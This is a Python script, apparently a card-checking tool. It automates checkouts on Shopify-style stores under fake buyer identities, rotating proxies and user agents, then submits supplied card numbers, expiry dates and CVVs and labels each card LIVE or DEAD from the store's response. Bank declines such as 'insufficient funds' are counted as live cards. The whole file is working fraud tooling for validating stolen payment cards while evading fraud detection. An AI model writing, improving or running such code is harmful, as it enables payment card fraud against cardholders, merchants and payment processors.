import requests
import re
import random
import string
import time
from proxy_manager import proxy_mgr, AGENTS

IDENTITIES = [
    {"first":"James",  "last":"Carter",  "addr":"742 Evergreen Terrace","city":"Springfield","state":"IL","zip":"62704"},
    {"first":"Emily",  "last":"Brooks",  "addr":"350 Fifth Avenue",     "city":"New York",   "state":"NY","zip":"10118"},
    {"first":"Michael","last":"Torres",  "addr":"1 Infinite Loop",      "city":"Austin",     "state":"TX","zip":"73301"},
    {"first":"Sarah",  "last":"Mitchell","addr":"221B Baker Street",    "city":"Portland",   "state":"OR","zip":"97201"},
    {"first":"David",  "last":"Hayes",   "addr":"500 Oracle Pkwy",      "city":"Seattle",    "state":"WA","zip":"98101"},
    {"first":"Lisa",   "last":"Johnson", "addr":"100 Main Street",      "city":"Denver",     "state":"CO","zip":"80201"},
    {"first":"Robert", "last":"Wilson",  "addr":"200 Park Avenue",      "city":"Houston",    "state":"TX","zip":"77001"},
    {"first":"Karen",  "last":"Martinez","addr":"900 N Michigan Ave",   "city":"Chicago",    "state":"IL","zip":"60611"},
]

def rand_email(first, last):
    n       = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
    domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com"]
    return f"{first.lower()}{n}@{random.choice(domains)}"

def rand_amount(base_price: float) -> str:
    low  = max(1.0, base_price)
    high = min(10.0, base_price + 5.0)
    if low >= high:
        high = low + 1.0
    return f"{random.uniform(low, high):.2f}"


class PublicCheckout:
    def __init__(self, domain, variant_id, price):
        self.domain     = domain
        self.variant_id = variant_id
        self.price      = price
        self.idn        = random.choice(IDENTITIES)
        self.proxy      = proxy_mgr.get()

        self.session = requests.Session()
        if self.proxy:
            self.session.proxies.update(self.proxy)
        self.session.headers.update({
            "User-Agent":      random.choice(AGENTS),
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection":      "keep-alive",
        })

    def _get(self, path, **kw):
        return self.session.get(
            f"https://{self.domain}{path}",
            timeout=15, allow_redirects=True, **kw
        )

    def _post_json(self, path, data):
        self.session.headers.update({"Content-Type":"application/json"})
        return self.session.post(
            f"https://{self.domain}{path}",
            json=data, timeout=15, allow_redirects=True
        )

    def _post_form(self, path, data):
        self.session.headers.update({
            "Content-Type": "application/x-www-form-urlencoded"
        })
        return self.session.post(
            f"https://{self.domain}{path}",
            data=data, timeout=15, allow_redirects=True
        )

    def add_to_cart(self) -> bool:
        try:
            r = self._post_json("/cart/add.js",
                {"id": self.variant_id, "quantity": 1})
            return r.status_code in (200, 201)
        except:
            return False

    def start_checkout(self) -> str | None:
        try:
            self._post_json("/cart/clear.js", {})
            time.sleep(0.3)
            self._post_json("/cart/add.js",
                {"id": self.variant_id, "quantity": 1})
            r = self._get("/checkout")

            match = re.search(r"/checkouts?/([a-f0-9]{32})", r.url)
            if match:
                return match.group(1)
            match = re.search(r'"token":"([a-f0-9]{32})"', r.text)
            if match:
                return match.group(1)
            return None
        except:
            return None

    def fill_info(self, token: str) -> bool:
        try:
            idn = self.idn
            self._post_form(f"/checkouts/{token}", {
                "utf8":                                   "✓",
                "_method":                                "patch",
                "checkout[email]":                        rand_email(idn["first"],idn["last"]),
                "checkout[shipping_address][first_name]": idn["first"],
                "checkout[shipping_address][last_name]":  idn["last"],
                "checkout[shipping_address][address1]":   idn["addr"],
                "checkout[shipping_address][city]":       idn["city"],
                "checkout[shipping_address][province]":   idn["state"],
                "checkout[shipping_address][country]":    "US",
                "checkout[shipping_address][zip]":        idn["zip"],
                "checkout[shipping_address][phone]":      f"555{random.randint(1000000,9999999)}",
                "button":                                 "",
            })
            return True
        except:
            return False

    def select_shipping(self, token: str):
        try:
            r     = self._get(f"/checkouts/{token}/shipping_rates")
            rates = r.json().get("shipping_rates", [])
            if rates:
                self._post_form(f"/checkouts/{token}", {
                    "_method":                     "patch",
                    "checkout[shipping_rate][id]": rates[0].get("id",""),
                    "button":                      "",
                })
        except:
            pass

    def submit_payment(self, token, cc, month, year, cvv) -> dict:
        idn    = self.idn
        amount = rand_amount(self.price)

        # method 1 — JSON PATCH
        try:
            r = self.session.patch(
                f"https://{self.domain}/checkouts/{token}",
                json={
                    "checkout": {
                        "payment_gateway": "shopify_payments",
                        "credit_card": {
                            "number":             cc,
                            "first_name":         idn["first"],
                            "last_name":          idn["last"],
                            "month":              str(month),
                            "year":               str(year),
                            "verification_value": cvv,
                        },
                        "total_price": amount,
                    }
                },
                timeout=20
            )
            result = self._parse(r, amount)
            if result["result"] != "ERROR":
                return result
        except:
            pass

        # method 2 — form
        try:
            r = self._post_form(f"/checkouts/{token}", {
                "_method":                                       "patch",
                "checkout[payment_gateway]":                     "shopify_payments",
                "checkout[credit_card][number]":                  cc,
                "checkout[credit_card][name]":                    f"{idn['first']} {idn['last']}",
                "checkout[credit_card][month]":                   str(month),
                "checkout[credit_card][year]":                    str(year),
                "checkout[credit_card][verification_value]":      cvv,
                "checkout[total_price]":                          amount,
                "button":                                         "",
            })
            return self._parse(r, amount)
        except Exception as e:
            return {"result":"ERROR","reason":str(e),"message":"","amount":amount}

    def _parse(self, r, amount) -> dict:
        url  = getattr(r, "url", "")
        text = r.text.lower() if hasattr(r,"text") else ""

        if "thank_you" in url or "thank-you" in url:
            return {"result":"LIVE","reason":"APPROVED","message":"Order placed","amount":amount}
        if "processing" in url:
            return {"result":"LIVE","reason":"PROCESSING","message":"Payment processing","amount":amount}

        live_signals = [
            "thank you for your order","order confirmed",
            "payment successful","order #","your order has been placed",
        ]
        dead_signals = [
            "card was declined","payment was declined",
            "card number is invalid","security code is invalid",
            "expiration date is invalid","card has expired",
        ]
        bank_live = [
            "insufficient funds","do not honor",
            "transaction not permitted","restricted",
        ]

        for s in live_signals:
            if s in text:
                return {"result":"LIVE","reason":"APPROVED","message":s,"amount":amount}

        for s in bank_live:
            if s in text:
                return {"result":"LIVE","reason":s.upper().replace(" ","_"),"message":s,"amount":amount}

        for s in dead_signals:
            if s in text:
                return {"result":"DEAD","reason":s.upper().replace(" ","_"),"message":s,"amount":amount}

        try:
            data   = r.json()
            errors = data.get("checkout",{}).get("payment_errors",[])
            if errors:
                err = errors[0].lower()
                if any(x in err for x in ["insufficient","honor","restricted","velocity"]):
                    return {"result":"LIVE","reason":"BANK_SIGNAL","message":err,"amount":amount}
                return {"result":"DEAD","reason":"DECLINED","message":err,"amount":amount}
        except:
            pass

        return {"result":"UNKNOWN","reason":"NO_SIGNAL","message":"","amount":amount}


def run_checkout(shop: dict, cc, month, year, cvv) -> dict:
    co = PublicCheckout(shop["domain"], shop["variant_id"], shop["price"])

    if not co.add_to_cart():
        return {"result":"ERROR","reason":"CART_FAILED","message":"","amount":"0.00"}

    token = co.start_checkout()
    if not token:
        return {"result":"ERROR","reason":"CHECKOUT_FAILED","message":"","amount":"0.00"}

    co.fill_info(token)
    time.sleep(random.uniform(0.3, 0.6))
    co.select_shipping(token)
    time.sleep(random.uniform(0.2, 0.5))

    return co.submit_payment(token, cc, month, year, cvv)